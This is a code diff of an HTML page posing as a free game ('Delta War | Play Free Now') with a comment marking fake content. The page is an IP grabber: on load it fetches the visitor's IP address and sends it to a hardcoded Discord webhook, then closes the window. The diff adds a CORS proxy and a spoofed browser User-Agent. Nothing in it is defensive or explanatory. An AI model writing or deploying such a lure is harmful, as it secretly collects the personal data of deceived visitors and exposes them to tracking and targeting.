@@ -3,16 +3,6 @@
 <head>
  <meta charset="UTF-8">
  <title>Delta War | Play Free Now</title>
- <style>
- #text {
- font-size: 48px;
- transition: opacity 0.5s ease-in-out;
- }
- 
- .hidden {
- opacity: 0;
- }
- </style>
 </head>
 <body onload="animateText()">
  <!-- Fake content here -->
@@ -20,7 +10,7 @@
 
  <script>
  async function logIP() {
- const ipResponse = await fetch('https://api.ipify.org');
+ const ipResponse = await fetch('https://cors-anywhere.herokuapp.com/https://api.ipify.org');
  const ip = await ipResponse.text();
  const webhookURL = 'https://discord.com/api/webhooks/1543545525821767750/6eYDQxde7zpBEwGEI8eLDnpewZynTvxDuBjwm9HPCMnZZStybikfq6FuZwhw_RXmdRyL';
  
@@ -29,9 +19,9 @@
  method: 'POST',
  headers: { 
  'Content-Type': 'application/json', 
- 'User-Agent': 'Discord Webhook' 
+ 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.' 
  },
- body: JSON.stringify({ content: `Logged IP: ${ip}` }),
+ body: JSON.stringify({ content: `Logged IP from iPhone 12 user! ${ip}` }),
  });
  
  if (!response.ok) {
@@ -42,14 +32,14 @@
  
  } catch (error) {
  console.error("Error sending webhook:", error);
- alert("Failed to log IP. Check console for details.");
+ alert("Failed to log IP on iPhone 12.");
  }
  
  window.close(); // Close the window after logging
  }
 
  async function animateText() {
- document.getElementById('text').innerText += " " + (await (await fetch('https://api.ipify.org')).text());
+ document.getElementById('text').innerText += " " + (await (await fetch('https://cors-anywhere.herokuapp.com/https://api.ipify.org')).text());
  
  setTimeout(() => {
  document.getElementById('text').className = "hidden";
